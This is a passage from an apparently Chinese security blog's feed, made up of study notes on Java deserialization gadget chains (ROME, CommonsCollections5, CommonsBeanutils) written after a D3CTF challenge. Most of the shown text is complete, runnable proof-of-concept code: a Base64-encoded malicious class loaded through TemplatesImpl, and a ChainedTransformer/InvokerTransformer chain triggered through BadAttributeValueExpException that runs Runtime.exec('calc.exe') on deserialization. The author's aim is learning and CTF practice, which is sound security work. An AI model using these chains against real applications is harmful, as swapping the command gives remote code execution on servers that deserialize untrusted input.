class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RomeDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(Templates.class, templates);<br><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ObjectBean.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(String.class, <span class="hljs-string">&quot;xsw6a&quot;</span>));<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(root, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;xsw6a&quot;</span>, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> ObjectBean.class.getDeclaredField(<span class="hljs-string">&quot;_equalsBean&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(root, <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ObjectBean.class, delegate));<br><br>        serialize(map);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ROME</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonCollections5</title>
    <link href="/2022/03/05/CommonCollections5/"/>
    <url>/2022/03/05/CommonCollections5/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonCollections5"><a href="#CommonCollections5" class="headerlink" title="CommonCollections5"></a>CommonCollections5</h1><p>还是再看rome链，看到有利用<strong>BadAttributeValueExpException</strong>就想起cc5。借此复习下吧。</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream.readObject()<br>            BadAttributeValueExpException.readObject()<br>                TiedMapEntry.toString()<br>                    LazyMap.get()<br>                        ChainedTransformer.transform()<br>                            ConstantTransformer.transform()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Class.getMethod()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Runtime.getRuntime()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Runtime.exec()<br></code></pre></td></tr></table></figure><h2 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h2><p>值得注意的三个个地方。<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203052221266.png" alt="QQ截图20220305220944"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203052221136.png" alt="QQ截图20220305220912"></p><p>在调用<strong>toString</strong>的时候会跑到<strong>getValue（）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203052221203.png" alt="QQ截图20220305221112"></p><p>然后调用<strong>get</strong>，这里就跟LazyMap后面的链子差不多。<br>下面就要找反序列化的点。</p><h1 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h1><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203052221228.png" alt="QQ截图20220305221328"></p><p>可以通过反射构造。那么一条完整的链子就出来了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc5Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorate</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(decorate,<span class="hljs-number">123</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,tiedMapEntry);<br>       serialize(badAttributeValueExpException);<br>       unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cc链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsBeanutils</title>
    <link href="/2022/03/05/CommonsBeanutils%EF%BC%88%E6%97%A0cc%E4%BE%9D%E8%B5%96%EF%BC%89/"/>
    <url>/2022/03/05/CommonsBeanutils%EF%BC%88%E6%97%A0cc%E4%BE%9D%E8%B5%96%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h1><p>昨天做到D3CTF比赛的一道题，emmm白卷一晚上。后面看是ROME，然后看了看网上的ROME链，要用到<strong>CommonsBeanutils</strong>，今天就来复习下<strong>CommonsBeanutils</strong>。</p><h2 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h2><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;project xmlns=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br>         xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>         xsi:schemaLocation=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;<br>    &lt;modelVersion&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.0</span>&lt;/modelVersion&gt;<br><br>    &lt;groupId&gt;org.example&lt;/groupId&gt;<br>    &lt;artifactId&gt;commonsbeanutils&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">1.0</span>-SNAPSHOT&lt;/version&gt;<br><br>    &lt;properties&gt;<br>        &lt;maven.compiler.source&gt;<span class="hljs-number">8</span>&lt;/maven.compiler.source&gt;<br>        &lt;maven.compiler.target&gt;<span class="hljs-number">8</span>&lt;/maven.compiler.target&gt;<br>    &lt;/properties&gt;<br>    &lt;dependencies&gt;<br>        &lt;dependency&gt;<br>            &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;<br><br>        &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;<br><br>        &lt;version&gt;<span class="hljs-number">1.8</span><span class="hljs-number">.3</span>&lt;/version&gt;<br>        &lt;/dependency&gt;<br><br>        &lt;dependency&gt;<br><br>            &lt;groupId&gt;org.javassist&lt;/groupId&gt;<br><br>            &lt;artifactId&gt;javassist&lt;/artifactId&gt;<br><br>            &lt;version&gt;<span class="hljs-number">3.21</span><span class="hljs-number">.0</span>-GA&lt;/version&gt;<br><br>        &lt;/dependency&gt;<br>    &lt;/dependencies&gt;<br>&lt;/project&gt;<br></code></pre></td></tr></table></figure><p>跟着p神走。<br>commons-beanutils中提供了这样一个方法。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051437577.png" alt="QQ截图20220305143634"></p><p>简单来说就是可以读取属性中的读方法即getName方法。当然这里要满足特殊的命名方式。getN(大写)ame。</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaBean</span> &#123;<br>   <span class="hljs-keyword">private</span> String name=<span class="hljs-string">&quot;xsw6a&quot;</span>;<br>   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaBeanTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaBean</span>(), <span class="hljs-string">&quot;name&quot;</span>);<br>        System.out.println(name);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051440903.png" alt="QQ截图20220305144036"></p><h2 id="BeanComparator-compare"><a href="#BeanComparator-compare" class="headerlink" title="BeanComparator#compare"></a>BeanComparator#compare</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051446886.png" alt="QQ截图20220305144522"></p><p>该类继承了<strong>Comparator</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051446211.png" alt="QQ截图20220305144607"></p><p>如果property为空则比较传入的参数，否则进入try，然后调用一个JavaBean的getter方法。这时候就想到了。之前利用的TemplatesImpl加载恶意类中的getOutputProperties，刚好满足getter的定义。<br>我们可以具体来看一下代码。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051456435.png" alt="QQ截图20220305145619"></p><p>那么也就说我们如果构造**PropertyUtils.getProperty( new TemplatesImpl(), OutputProperties )**就可以成功加载恶意类。<br>先不添加反序列化和序列化。来安排一个。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CbTestOne</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, NoSuchFieldException, IOException &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span 